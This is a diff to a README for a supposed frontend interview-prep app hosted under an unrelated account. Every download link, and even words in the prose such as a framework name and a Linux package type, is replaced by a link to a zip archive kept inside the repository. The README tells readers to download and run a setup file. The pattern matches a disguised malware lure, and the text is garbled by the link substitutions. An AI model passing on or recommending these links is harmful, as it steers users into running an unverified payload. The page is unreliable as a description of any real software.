@@ -1,10 +1,10 @@
 # 🎯 frontend-interview-prep - Ace Your Next Interview with Confidence
 
-[![Download from Releases](https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip)
+[![Download from Releases](https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip%20Now-Get%20Started-brightgreen)](https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip)
 
 ## 🌟 Overview
 
-Welcome to **frontend-interview-prep**, a user-friendly platform designed to help you master over 400 senior-level interview questions. Whether you're preparing for roles in Angular, React, https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip, or Redux, this tool has you covered. Enjoy a beautiful user interface, track your progress, practice in various modes, and leverage progressive web app (PWA) support for an optimal experience.
+Welcome to **frontend-interview-prep**, a user-friendly platform designed to help you master over 400 senior-level interview questions. Whether you're preparing for roles in Angular, React, https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip, or Redux, this tool has you covered. Enjoy a beautiful user interface, track your progress, practice in various modes, and leverage progressive web app (PWA) support for an optimal experience.
 
 ## 🛠 Features
 
@@ -16,19 +16,19 @@ Welcome to **frontend-interview-prep**, a user-friendly platform designed to hel
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip) to download the application. Follow these steps:
+To get started, visit our [Releases page](https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip) to download the application. Follow these steps:
 
 1. Click on the link above.
 2. Locate the latest version of the application.
 3. Download the appropriate file for your operating system.
    - For **Windows**, look for `.exe`
    - For **Mac**, look for `.dmg`
-   - For **Linux**, look for `https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip` or `.deb`
+   - For **Linux**, look for `https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip` or `.deb`
 4. Once downloaded, run the setup file and follow the prompts to install the application.
 
 You can also visit the Releases page directly by clicking the button below:
 
-[![Download from Releases](https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip)
+[![Download from Releases](https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip%20Now-Get%20Started-brightgreen)](https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip)
 
 ## 🚀 System Requirements
 
@@ -43,7 +43,7 @@ Before installation, ensure your system meets the following requirements:
 
 1. **Launch the App**: Open the installed application.
 2. **Create an Account**: Sign up to track your progress.
-3. **Choose Your Topic**: Select Angular, React, https://raw.githubusercontent.com/WINTOONLINECASINO/frontend-interview-prep/main/storm/frontend-interview-prep.zip, or Redux.
+3. **Choose Your Topic**: Select Angular, React, https://github.com/WINTOONLINECASINO/frontend-interview-prep/raw/refs/heads/main/src/security/frontend_interview_prep_3.7.zip, or Redux.
 4. **Start Practicing**: Use the progress tracking features to enhance your learning.
 5. **Review Answers**: After attempting the questions, go through the correct answers to understand better.
 
